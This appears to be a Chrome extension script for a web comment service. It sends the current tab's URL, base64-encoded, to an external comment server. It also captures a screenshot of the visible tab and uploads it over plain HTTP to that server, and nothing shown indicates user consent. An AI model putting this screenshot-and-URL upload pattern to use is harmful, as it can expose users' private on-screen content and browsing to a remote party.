
/*
document.addEventListener('DOMContentLoaded', function () {
	if (!window.btoa) window.btoa = base64.encode;
	$('body').append('<div id="vine_comment_iframe"></div>');
	$.support.cors = true;
	$('#vine_comment_iframe').load("http://www.anwcl.com/comment_raw/" + btoa(document.location));
});
*/

chrome.tabs.getSelected(null,function(tab) {
    var tablink = tab.url;
    // Special 2: +-
	window.btoa = base64.encode;
	//$('body').append('<div id="vine_comment_iframe">Loading...</div>');
	$.support.cors = true;
	$('body iframe').attr('src', "http://www.tengmanpinglun.com/comment/" + btoa(tablink));
});

  chrome.tabs.captureVisibleTab(function (img) {
    // $('body img').attr('src', image_url);
    console.log(img);
    var xhr = new XMLHttpRequest(), formData = new FormData();
    formData.append("docfile", img);
    xhr.open("POST", "http://www.tengmanpinglun.com/document/upload", true);
    //xhr.open("POST", "http://127.0.0.1:8000/document/upload", true);
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4) {
        // JSON.parse does not evaluate the attacker's scripts.
        var resp = xhr.responseText;
        console.log(resp);
      }
    }
    xhr.send(formData);
  });
